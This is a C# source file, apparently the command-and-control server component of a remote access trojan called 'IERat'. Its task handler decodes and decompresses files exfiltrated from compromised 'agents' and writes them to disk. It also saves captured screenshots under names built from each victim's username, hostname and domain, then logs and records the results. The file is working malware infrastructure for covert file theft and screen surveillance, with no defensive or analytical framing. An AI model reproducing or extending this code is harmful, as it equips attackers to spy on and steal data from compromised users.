using IERat.lib;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IERatServer.lib
{
    class Actions
    {
        public static void HandleAdvancedTasks(RequestObject requestobject, TaskObject taskObject)
        {
            try
            {
                if (taskObject.Type == "download")
                {
                    var destinationFile = File.Create(taskObject.args);
                    var fileBytes = Decompress(Convert.FromBase64String(taskObject.Result));
                    destinationFile.Write(fileBytes);

                    Console.WriteLine($"\nDownload successfull [{taskObject.Type} {taskObject.args}]\n");
                    Logger.Log("info", $"Download was successfull from agent {requestobject.AgentID} [{taskObject.Type} {taskObject.args}]");
                    taskObject.Result = $"Successfully downloaded {destinationFile}";
                }
                if (taskObject.Type == "screenshot")
                {
                    AgentChannel ActiveChannel = Db.GetChannelFromID(requestobject.AgentID);
                    var agent = ActiveChannel.agent;
                    var filepath = $"{agent.Username}-{agent.Hostname}-{agent.Domain}-{DateTime.Now.Day}{DateTime.Now.Month}{DateTime.Now.Year}-{DateTime.Now.Hour}{DateTime.Now.Minute}{DateTime.Now.Second}.jpg";
                    var destinationFile = File.Create(filepath);
                    var fileBytes = Decompress(Convert.FromBase64String(taskObject.Result));
                    destinationFile.Write(fileBytes);

                    Console.WriteLine($"Screenshot saved successfully to {filepath}\n");
                    Logger.Log("info", $"Screenshot was successfull saved from agent {requestobject.AgentID} to file {filepath}");
                    taskObject.Result = "Screenshot saved successfully";
                }
                Db.TaskHistory.Add(new TaskHistoryObject() { AgentID = requestobject.AgentID, task = taskObject });

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Logger.Log("error", ex.Message);
            }
        }

        static byte[] Compress(byte[] data)
        {
            using var compressedStream = new MemoryStream();
            using var zipStream = new GZipStream(compressedStream, CompressionMode.Compress);
            zipStream.Write(data, 0, data.Length);
            zipStream.Close();
            return compressedStream.ToArray();
        }

        static byte[] Decompress(byte[] data)
        {
            using var compressedStream = new MemoryStream(data);
            using var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress);
            using var resultStream = new MemoryStream();
            zipStream.CopyTo(resultStream);
            return resultStream.ToArray();
        }
    }
}
